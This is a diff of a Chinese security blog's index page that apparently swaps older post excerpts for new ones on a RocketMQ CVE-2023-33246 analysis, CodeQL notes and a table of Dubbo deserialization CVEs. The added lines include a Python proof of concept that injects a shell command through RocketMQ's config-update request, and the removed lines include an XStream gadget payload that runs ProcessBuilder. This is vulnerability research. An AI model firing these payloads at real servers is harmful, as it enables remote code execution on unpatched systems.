@@ -45,7 +45,7 @@ ga('send', 'pageview');
 
   
 
-<meta name="generator" content="Hexo 5.2.0"></head>
+<meta name="generator" content="Hexo 5.4.2"></head>
 
 <body>
   <div id="container" q-class="show:isCtnShow">
@@ -171,36 +171,42 @@ ga('send', 'pageview');
           <div id="js-content" class="content-ll">
             
   
-    <article id="post-OpenRASP学习笔记（一）" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+    <article id="post-RocketMQ-CVE-2023-33246-漏洞分析" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2021/07/13/OpenRASP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/">OpenRASP学习笔记（一）</a>
+      <a class="article-title" href="/2023/08/14/RocketMQ-CVE-2023-33246-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">RocketMQ CVE-2023-33246/CVE-2023-37582 漏洞分析</a>
     </h1>
   
 
         
-        <a href="/2021/07/13/OpenRASP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/" class="archive-article-date">
-  	<time datetime="2021-07-13T10:23:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-07-13</time>
+        <a href="/2023/08/14/RocketMQ-CVE-2023-33246-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" class="archive-article-date">
+  	<time datetime="2023-08-14T06:32:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2023-08-14</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>RASP（Runtime Application self-protection）技术自Gartner在2014年提出，已经有挺长一段时间了。大厂们现在基本也都有自研的RASP、IAST产品。在开源RASP中，应以OpenRASP起步最早，应用也最广。不过因为性能原因，在实际攻防中覆盖面还是有限。</p>
-<p>RASP算是Java安全绕不开的一个技术点，有兴趣对此学习研究一番。参考文章中threedr3am、tr1ple、c0d3p1ut0s几个师傅们对于OpenRASP的原理、技术点都有跟踪和解释，因此本文不再多做类似的阐释，主要针对自己的一些知识盲点、兴趣点，做做研究与笔记。</p>
-<h2 id="OpenRASP的Hook"><a href="#OpenRASP的Hook" class="headerlink" title="OpenRASP的Hook"></a>OpenRASP的Hook</h2><p>关注两点：</p>
-<ol>
-<li>如何Hook的</li>
-<li>Hook了哪些类的哪些方法</li>
-</ol>
-<h3 id="如何Hook"><a href="#如何Hook" class="headerlink" title="如何Hook"></a>如何Hook</h3>
+        <h1 id="0x01-CVE-2023-33246"><a href="#0x01-CVE-2023-33246" class="headerlink" title="0x01 CVE-2023-33246"></a>0x01 CVE-2023-33246</h1><blockquote>
+<p>漏洞描述<br>RocketMQ 5.1.0及以下版本，在一定条件下，存在远程命令执行风险。RocketMQ的NameServer、Broker、Controller等多个组件外网泄露，缺乏权限验证，攻击者可以利用该漏洞利用更新配置功能以RocketMQ运行的系统用户身份执行命令。 此外，攻击者可以通过伪造 RocketMQ 协议内容来达到同样的效果。</p>
+</blockquote>
+<blockquote>
+<p>影响版本<br>5.0.0 &lt;= Apache RocketMQ &lt; 5.1.1<br>4.0.0 &lt;= Apache RocketMQ &lt; 4.9.6</p>
+</blockquote>
+<h2 id="1-1-环境搭建"><a href="#1-1-环境搭建" class="headerlink" title="1.1 环境搭建"></a>1.1 环境搭建</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">vim bin/runserver.sh</span><br><span class="line"># 增加DEBUG JAVA OPT</span><br><span class="line">JAVA_OPT=<span class="string">&quot;$&#123;JAVA_OPT&#125; -Xdebug -Xrunjdwp:transport=dt_socket,address=5005,server=y,suspend=n&quot;</span></span><br><span class="line">vim bin/runbroker.sh</span><br><span class="line"># 增加DEBUG JAVA OPT</span><br><span class="line">JAVA_OPT=<span class="string">&quot;$&#123;JAVA_OPT&#125; -Xdebug -Xrunjdwp:transport=dt_socket,address=5006,server=y,suspend=n&quot;</span></span><br><span class="line"></span><br><span class="line">./mqbroker -n <span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">9876</span></span><br><span class="line">./mqnamesrv</span><br></pre></td></tr></table></figure>
+
+<h3 id="1-2-POC复现"><a href="#1-2-POC复现" class="headerlink" title="1.2 POC复现"></a>1.2 POC复现</h3><h3 id="1-2-1-POC"><a href="#1-2-1-POC" class="headerlink" title="1.2.1 POC"></a>1.2.1 POC</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line">client = socket.socket()</span><br><span class="line">client.connect((<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">10911</span>))</span><br><span class="line"><span class="comment"># data</span></span><br><span class="line">json = <span class="string">&#x27;&#123;&quot;code&quot;:25,&quot;extFields&quot;:&#123;&quot;test&quot;:&quot;RockedtMQ&quot;&#125;,&quot;flag&quot;:0,&quot;language&quot;:&quot;JAVA&quot;,&quot;opaque&quot;:266,&quot;serializeTypeCurrentRPC&quot;:&quot;JSON&quot;,&quot;version&quot;:433&#125;&#x27;</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">cmd = <span class="string">&quot;-c $@| sh . echo echo &#x27;touch /tmp/success_rocketmq&#x27; | bash -i&quot;</span></span><br><span class="line">body=<span class="string">f&#x27;filterServerNums=1\nnamesrvAddr=127.0.0.1:9876\nrocketmqHome=<span class="subst">&#123;cmd&#125;</span>&#x27;</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">json_lens = int(len(binascii.hexlify(json).decode(<span class="string">&#x27;utf-8&#x27;</span>))/<span class="number">2</span>)</span><br><span class="line">head1 = <span class="string">&#x27;00000000&#x27;</span>+str(hex(json_lens))[<span class="number">2</span>:]</span><br><span class="line">all_lens = int(<span class="number">4</span>+len(binascii.hexlify(body).decode(<span class="string">&#x27;utf-8&#x27;</span>))/<span class="number">2</span>+json_lens)</span><br><span class="line">head2 = <span class="string">&#x27;00000000&#x27;</span>+str(hex(all_lens))[<span class="number">2</span>:]</span><br><span class="line">data = head2[<span class="number">-8</span>:]+head1[<span class="number">-8</span>:]+binascii.hexlify(json).decode(<span class="string">&#x27;utf-8&#x27;</span>)+binascii.hexlify(body).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"><span class="comment"># send</span></span><br><span class="line">client.send(bytes.fromhex(data))</span><br><span class="line">data_recv = client.recv(<span class="number">1024</span>)</span><br><span class="line">print(data_recv)</span><br></pre></td></tr></table></figure>
+
+<h4 id="1-2-2-疑问POC"><a href="#1-2-2-疑问POC" class="headerlink" title="1.2.2 疑问POC"></a>1.2.2 疑问POC</h4><p>参考【1】中的POC，执行总是会报错connect to 127.0.0.1:10911 failed，Google反馈的大都是配置broker，但是实际测试仍然报错。</p>
+<blockquote>
+<p>TODO: 分析原因</p>
+</blockquote>
         
-          <a class="article-more-a" href="/2021/07/13/OpenRASP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/#more">more >></a>
+          <a class="article-more-a" href="/2023/08/14/RocketMQ-CVE-2023-33246-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/#more">more >></a>
         
       
 
@@ -214,11 +220,91 @@ ga('send', 'pageview');
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">OpenRASP</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">CVE-2023-33246</a>
         		</li>
       		 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">RASP</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">RocketMQ</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+
+  
+    <article id="post-CodeQL升级之坑" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2023/08/09/CodeQL%E5%8D%87%E7%BA%A7%E4%B9%8B%E5%9D%91/">CodeQL 升级V2.14踩坑</a>
+    </h1>
+  
+
+        
+        <a href="/2023/08/09/CodeQL%E5%8D%87%E7%BA%A7%E4%B9%8B%E5%9D%91/" class="archive-article-date">
+  	<time datetime="2023-08-09T03:29:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2023-08-09</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <ul>
+<li>升级前 v2.13.1</li>
+<li>升级后 v2.14.1 </li>
+</ul>
+<p>升级前kafka jass ql 运行得好好的，升级后跑不出来。。。<br>好在以前遇到过这种问题，大概率又是CodeQL 升级的锅</p>
+<h2 id="0x01-猜测1-databae问题"><a href="#0x01-猜测1-databae问题" class="headerlink" title="0x01 猜测1: databae问题"></a>0x01 猜测1: databae问题</h2><p>database是v2.10.4版本codeql create的</p>
+<p>用v2.13.1 版本codeql create，发现再codeql v2.14.1 ql run仍然不行，无结果，尝试用v2.14.1构建db</p>
+<p>用v2.14.1构建，发现仍然失败</p>
+        
+          <a class="article-more-a" href="/2023/08/09/CodeQL%E5%8D%87%E7%BA%A7%E4%B9%8B%E5%9D%91/#more">more >></a>
+        
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">CodeQL</a>
         		</li>
       		
 		</ul>
@@ -230,7 +316,7 @@ ga('send', 'pageview');
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="/categories/Java安全//" class="article-tag-list-link color2">Java安全</a>
+        			<a href="/categories/CodeQL//" class="article-tag-list-link color2">CodeQL</a>
         		</li>
       		
 		</ul>
@@ -266,49 +352,36 @@ ga('send', 'pageview');
 
 
   
-    <article id="post-JVM-Attach" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+    <article id="post-Apache-Dubbo-All-roads-lead-to-RCE-笔记" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2021/06/21/JVM-Attach/">从冰蝎antiAgent看Java Attach机制</a>
+      <a class="article-title" href="/2023/05/11/Apache-Dubbo-All-roads-lead-to-RCE-%E7%AC%94%E8%AE%B0/">《Apache Dubbo: All roads lead to RCE》CodeQL 笔记</a>
     </h1>
   
 
         
-        <a href="/2021/06/21/JVM-Attach/" class="archive-article-date">
-  	<time datetime="2021-06-21T09:24:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-06-21</time>
+        <a href="/2023/05/11/Apache-Dubbo-All-roads-lead-to-RCE-%E7%AC%94%E8%AE%B0/" class="archive-article-date">
+  	<time datetime="2023-05-11T09:24:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2023-05-11</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>webshell的隐藏与检出一直以来都是攻防的焦点，随着内存马的研究与工具的公开，内存shell已然成为了webshell主流。</p>
-<p>引用【9】中关于攻击的思路</p>
-<blockquote>
-<ol>
-<li>基于Servlet规范的利用，动态注册Servlet规范中的组件，包括Servlet，Filter，Listener，这部分的公开文章比较多，比如：基于tomcat的内存 Webshell 无文件攻击技术（<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7388%EF%BC%89%E3%80%82">https://xz.aliyun.com/t/7388）。</a></li>
-<li>基于特定框架的利用，框架一般对于Servlet又进行了一层封装，动态注册框架的路由，文章：基于内存 Webshell 的无文件攻击技术研究（<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/198886%EF%BC%89">https://www.anquanke.com/post/id/198886）</a></li>
-<li>基于javaagent修改Servlet处理流程中的字节码，工具：memShell（<a target="_blank" rel="noopener" href="https://github.com/rebeyond/memShell%EF%BC%89">https://github.com/rebeyond/memShell）</a></li>
-</ol>
-</blockquote>
-<p>引用【8】中关于检测的思路</p>
-<blockquote>
-<p>无论是以上哪种攻击方式，从防守方的角度来说，检测的方式都是通过java instrumentation机制，将检测jar包attach到tomcat jvm，检查加载到jvm中的类是否异常。整体检测思路为：</p>
-<ol>
-<li>获取tomcat jvm中所有加载的类</li>
-<li>遍历每个类，判断是否为风险类。我们把可能被攻击方新增/修改内存中的类，标记为风险类（比如实现了filter/servlet的类）</li>
-<li>遍历风险类，检查是否为webshell：</li>
-<li>检查高风险类的class文件是否存在；</li>
-<li>反编译风险类字节码，检查java文件中包含恶意代码</li>
-</ol>
-</blockquote>
-<p>有攻有防，而防御又引发攻击的升级，冰蝎最新版已经加入了反VirtualMachine.Attach功能。</p>
+        <p>《Apache Dubbo: All roads lead to RCE》算是最早公开利用CodeQL 挖掘漏洞的文章，能够半自动化漏洞挖掘，难怪pwntester 祖师爷的产出能够如此高效。</p>
+<h2 id="0x01-Dubbo背景"><a href="#0x01-Dubbo背景" class="headerlink" title="0x01 Dubbo背景"></a>0x01 Dubbo背景</h2><p>Dubbo 的漏洞原理可以参考上一篇文章。</p>
+<p>环境：</p>
+<ul>
+<li>Dubbo 2.7.8</li>
+<li>Codeql 2.13.1</li>
+</ul>
+<p>Codeql 一直在增加框架的支持，pwntester的这篇文章发布在2021年9月，在2023年5月2.13.1版本中，已经增加了对于Netty的Source支持。</p>
         
-          <a class="article-more-a" href="/2021/06/21/JVM-Attach/#more">more >></a>
+          <a class="article-more-a" href="/2023/05/11/Apache-Dubbo-All-roads-lead-to-RCE-%E7%AC%94%E8%AE%B0/#more">more >></a>
         
       
 
@@ -322,15 +395,11 @@ ga('send', 'pageview');
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">Java</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">CodeQL</a>
         		</li>
       		 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">冰蝎</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">Attach</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">Dubbo</a>
         		</li>
       		
 		</ul>
@@ -342,7 +411,7 @@ ga('send', 'pageview');
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="/categories/Java安全//" class="article-tag-list-link color2">Java安全</a>
+        			<a href="/categories/CodeQL//" class="article-tag-list-link color2">CodeQL</a>
         		</li>
       		
 		</ul>
@@ -378,32 +447,128 @@ ga('send', 'pageview');
 
 
   
-    <article id="post-XStream反序列化详解（二）" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+    <article id="post-Dubbo-历史漏洞分析" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2021/05/10/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%AF%A6%E8%A7%A3%EF%BC%88%E4%BA%8C%EF%BC%89/">XStream反序列化详解（二）</a>
+      <a class="article-title" href="/2023/03/20/Dubbo-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">Apache Dubbo 历史漏洞分析与总结</a>
     </h1>
   
 
         
-        <a href="/2021/05/10/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%AF%A6%E8%A7%A3%EF%BC%88%E4%BA%8C%EF%BC%89/" class="archive-article-date">
-  	<time datetime="2021-05-10T09:04:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-05-10</time>
+        <a href="/2023/03/20/Dubbo-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" class="archive-article-date">
+  	<time datetime="2023-03-20T06:12:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2023-03-20</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>前文已经讲过XStream的反序列化特性及漏洞产生的原因，以及&lt;=1.4.6版本的几个gadget，在此背景上，本节准备复现披露的几个RCE CVE，正向分析下。</p>
-<p>XStream团队很有意思，安全公告会把POC也公开，具体可以看<a target="_blank" rel="noopener" href="https://x-stream.github.io/security.html%E3%80%82">https://x-stream.github.io/security.html。</a></p>
-<h2 id="CVE-2020-26217"><a href="#CVE-2020-26217" class="headerlink" title="CVE-2020-26217"></a>CVE-2020-26217</h2><p>这个其实就是Wh1t3p1g师傅中提到的第4个ImageIO gadget，在marshalsec gadgets ImageIO中也有，下面正向跟踪下。</p>
-<h3 id="Wh1t3p1g师傅的POC"><a href="#Wh1t3p1g师傅的POC" class="headerlink" title="Wh1t3p1g师傅的POC"></a>Wh1t3p1g师傅的POC</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">&lt;map&gt;</span><br><span class="line">  &lt;entry&gt;</span><br><span class="line">    &lt;jdk.nashorn.internal.objects.NativeString&gt;</span><br><span class="line">      &lt;flags&gt;0&lt;&#x2F;flags&gt;</span><br><span class="line">      &lt;value class&#x3D;&quot;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&quot;&gt;</span><br><span class="line">        &lt;dataHandler&gt;</span><br><span class="line">          &lt;dataSource class&#x3D;&quot;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&quot;&gt;</span><br><span class="line">            &lt;is class&#x3D;&quot;javax.crypto.CipherInputStream&quot;&gt;</span><br><span class="line">              &lt;cipher class&#x3D;&quot;javax.crypto.NullCipher&quot;&gt;</span><br><span class="line">                &lt;initialized&gt;false&lt;&#x2F;initialized&gt;</span><br><span class="line">                &lt;opmode&gt;0&lt;&#x2F;opmode&gt;</span><br><span class="line">                &lt;serviceIterator class&#x3D;&quot;javax.imageio.spi.FilterIterator&quot;&gt;</span><br><span class="line">                  &lt;iter class&#x3D;&quot;javax.imageio.spi.FilterIterator&quot;&gt;</span><br><span class="line">                    &lt;iter class&#x3D;&quot;java.util.Collections$EmptyIterator&quot;&#x2F;&gt;</span><br><span class="line">                    &lt;next class&#x3D;&quot;java.lang.ProcessBuilder&quot;&gt;</span><br><span class="line">                      &lt;command class&#x3D;&quot;java.util.Arrays$ArrayList&quot;&gt;</span><br><span class="line">                        &lt;a class&#x3D;&quot;string-array&quot;&gt;</span><br><span class="line">                          &lt;string&gt;open&lt;&#x2F;string&gt;</span><br><span class="line">                          &lt;string&gt;-a&lt;&#x2F;string&gt;</span><br><span class="line">                          &lt;string&gt;calculator.app&lt;&#x2F;string&gt;</span><br><span class="line">                        &lt;&#x2F;a&gt;</span><br><span class="line">                      &lt;&#x2F;command&gt;</span><br><span class="line">                      &lt;redirectErrorStream&gt;false&lt;&#x2F;redirectErrorStream&gt;</span><br><span class="line">                    &lt;&#x2F;next&gt;</span><br><span class="line">                  &lt;&#x2F;iter&gt;</span><br><span class="line">                  &lt;filter class&#x3D;&quot;javax.imageio.ImageIO$ContainsFilter&quot;&gt;</span><br><span class="line">                    &lt;method&gt;</span><br><span class="line">                      &lt;class&gt;java.lang.ProcessBuilder&lt;&#x2F;class&gt;</span><br><span class="line">                      &lt;name&gt;start&lt;&#x2F;name&gt;</span><br><span class="line">                      &lt;parameter-types&#x2F;&gt;</span><br><span class="line">                    &lt;&#x2F;method&gt;</span><br><span class="line">                    &lt;name&gt;foo&lt;&#x2F;name&gt;</span><br><span class="line">                  &lt;&#x2F;filter&gt;</span><br><span class="line">                  &lt;next class&#x3D;&quot;string&quot;&gt;foo&lt;&#x2F;next&gt;</span><br><span class="line">                &lt;&#x2F;serviceIterator&gt;</span><br><span class="line">                &lt;lock&#x2F;&gt;</span><br><span class="line">              &lt;&#x2F;cipher&gt;</span><br><span class="line">              &lt;input class&#x3D;&quot;java.lang.ProcessBuilder$NullInputStream&quot;&#x2F;&gt;</span><br><span class="line">              &lt;ibuffer&gt;&lt;&#x2F;ibuffer&gt;</span><br><span class="line">              &lt;done&gt;false&lt;&#x2F;done&gt;</span><br><span class="line">              &lt;ostart&gt;0&lt;&#x2F;ostart&gt;</span><br><span class="line">              &lt;ofinish&gt;0&lt;&#x2F;ofinish&gt;</span><br><span class="line">              &lt;closed&gt;false&lt;&#x2F;closed&gt;</span><br><span class="line">            &lt;&#x2F;is&gt;</span><br><span class="line">            &lt;consumed&gt;false&lt;&#x2F;consumed&gt;</span><br><span class="line">          &lt;&#x2F;dataSource&gt;</span><br><span class="line">          &lt;transferFlavors&#x2F;&gt;</span><br><span class="line">        &lt;&#x2F;dataHandler&gt;</span><br><span class="line">        &lt;dataLen&gt;0&lt;&#x2F;dataLen&gt;</span><br><span class="line">      &lt;&#x2F;value&gt;</span><br><span class="line">    &lt;&#x2F;jdk.nashorn.internal.objects.NativeString&gt;</span><br><span class="line">    &lt;jdk.nashorn.internal.objects.NativeString reference&#x3D;&quot;..&#x2F;jdk.nashorn.internal.objects.NativeString&quot;&#x2F;&gt;</span><br><span class="line">  &lt;&#x2F;entry&gt;</span><br><span class="line">  &lt;entry&gt;</span><br><span class="line">    &lt;jdk.nashorn.internal.objects.NativeString reference&#x3D;&quot;..&#x2F;..&#x2F;entry&#x2F;jdk.nashorn.internal.objects.NativeString&quot;&#x2F;&gt;</span><br><span class="line">    &lt;jdk.nashorn.internal.objects.NativeString reference&#x3D;&quot;..&#x2F;..&#x2F;entry&#x2F;jdk.nashorn.internal.objects.NativeString&quot;&#x2F;&gt;</span><br><span class="line">  &lt;&#x2F;entry&gt;</span><br><span class="line">&lt;&#x2F;map&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+        <table>
+<thead>
+<tr>
+<th>链接</th>
+<th>描述</th>
+<th>影响版本</th>
+<th>作者</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><a href="#0x02-CVE-2019-17564">CVE-2019-17564</a></td>
+<td>http协议，直接使用了Spring框架的<code>HttpInvokerServiceExporter</code>类做远程调用，而这个过程会读取POST请求的Body并进行反序列化</td>
+<td>2.7.0&lt;=Dubbo&lt;=2.7.4<br>2.6.0&lt;=Dubbo&lt;=2.6.7<br>2.5.x</td>
+<td><a target="_blank" rel="noopener" href="https://lists.apache.org/thread/lgk1xhlgb8t3dmlw10rx7drxs00yspd2">Dor Tumarkin@Chekmarx</a></td>
+</tr>
+<tr>
+<td><a href="#0x03-CVE-2020-1948">CVE-2020-1948</a></td>
+<td>Dubbo默认hessian进行反序列化，未验证参数类型，任意object参数都会进行反序列化，实际修复不完整</td>
+<td>2.7.0&lt;=Dubbo&lt;=2.7.6<br>2.6.0&lt;=Dubbo&lt;=2.6.7<br>2.5.x</td>
+<td><a target="_blank" rel="noopener" href="https://www.mail-archive.com/dev@dubbo.apache.org/msg06544.html">Ruilin</a></td>
+</tr>
+<tr>
+<td><a href="#0x04-CVE-2020-11995">CVE-2020-11995</a></td>
+<td>CVE-2020-1948 的绕过，参数类型验证保留了动态调用，$invoke\$invokeAsync\$echo 三个方法的参数仍然可例用，补丁修复仍然不全<a target="_blank" rel="noopener" href="https://securitylab.github.com/advisories/GHSL-2021-034_043-apache-dubbo/#issue-1-bypass-cve-2020-1948-mitigations-ghsl-2021-034">GHSL-2021-034</a>、<a target="_blank" rel="noopener" href="https://securitylab.github.com/advisories/GHSL-2021-097-apache-dubbo/">GHSL-2021-097</a></td>
+<td>2.7.0&lt;=Dubbo&lt;=2.7.8<br>2.6.0&lt;=Dubbo&lt;=2.6.8<br>2.5.x</td>
+<td></td>
+</tr>
+<tr>
+<td><a href="#0x05-CVE-2021-25641">CVE-2021-25641</a></td>
+<td><a target="_blank" rel="noopener" href="https://securitylab.github.com/advisories/GHSL-2021-034_043-apache-dubbo/#issue-2-bypass-hessian2-allowlist-via-alternative-protocols-ghsl-2021-035">GHSL-2021-035</a> Dubbo除了支持hessian协议，还支持其他总共14协议，这些协议里面也有反序列化问题</td>
+<td>dubbo-common&lt;=2.7.3<br>2.7.0&lt;=Dubbo&lt;=2.7.8<br>2.6.0&lt;=Dubbo&lt;=2.6.8<br>2.5.x</td>
+<td><a target="_blank" rel="noopener" href="https://lists.apache.org/thread/980x0wb42tghghwmskpcm47fc77936pp">Alvaro Munoz@GitHub Security Lab</a></td>
+</tr>
+<tr>
+<td><a href="#0x06-GHSL-2021-036">GHSL-2021-036</a></td>
+<td><a target="_blank" rel="noopener" href="https://securitylab.github.com/advisories/GHSL-2021-034_043-apache-dubbo/#issue-3-pre-auth-rce-via-multiple-hessian-deserializations-in-the-rpc-invocation-decoder-ghsl-2021-036">GHSL-2021-036</a> Dubbo中数据流有很多途径到达hessian#readObject，pwntester首次在这里提出这条链readUTF-&gt;readString-&gt;expect-&gt;readObject，这个和后续的CVE-2021-43297异曲同工，而且更短</td>
+<td>3.0.0&lt;=Dubbo&lt;=3.0.5<br>2.7.0&lt;=Dubbo&lt;=2.7.15<br>2.6.0&lt;=Dubbo&lt;=2.6.12</td>
+<td><a target="_blank" rel="noopener" href="https://lists.apache.org/thread/980x0wb42tghghwmskpcm47fc77936pp">Alvaro Munoz@GitHub Security Lab</a></td>
+</tr>
+<tr>
+<td><a href="#0x07-CVE-2021-30179">CVE-2021-30179</a></td>
+<td><a target="_blank" rel="noopener" href="https://securitylab.github.com/advisories/GHSL-2021-034_043-apache-dubbo/#issue-4-pre-auth-rce-via-java-deserialization-in-the-generic-filter-ghsl-2021-037">GHSL-2021-037</a>/<a target="_blank" rel="noopener" href="https://securitylab.github.com/advisories/GHSL-2021-034_043-apache-dubbo/#issue-5-pre-auth-rce-via-arbitrary-bean-manipulation-in-the-generic-filter-ghsl-2021-038">GHSL-2021-038</a> Dubbo支持动态调用，有几个特殊的函数：$invoke\$invokeAsync\$echo，这几个的逻辑在GenericFilter 中，这几个函数支持特定格式的参数，在还原和处理这几个函数时，支持pojo、bean、javanative等方式，会有setter/反序列化问题</td>
+<td>2.7.0&lt;=Dubbo&lt;=2.7.9<br>2.6.0&lt;=Dubbo&lt;=2.6.9<br>2.5.x</td>
+<td><a target="_blank" rel="noopener" href="https://lists.apache.org/thread/980x0wb42tghghwmskpcm47fc77936pp">Alvaro Munoz@GitHub Security Lab</a></td>
+</tr>
+<tr>
+<td><a href="#0x08-CVE-2021-32824">CVE-2021-32824</a></td>
+<td><a target="_blank" rel="noopener" href="https://securitylab.github.com/advisories/GHSL-2021-034_043-apache-dubbo/#issue-6-pre-auth-rce-via-arbitrary-bean-manipulation-in-the-telnet-handler-ghsl-2021-039">GHSL-2021-039</a> Dubbo支持Telnet，包括invoke 调用，原理和CVE-2021-30179 PojoUtils 利用类似</td>
+<td>2.7.0&lt;=Dubbo&lt;=2.7.9<br>2.6.0&lt;=Dubbo&lt;=2.6.9<br>2.5.x</td>
+<td><a target="_blank" rel="noopener" href="https://securitylab.github.com/advisories/GHSL-2021-034_043-apache-dubbo/#cve">Alvaro Munoz@GitHub Security Lab</a></td>
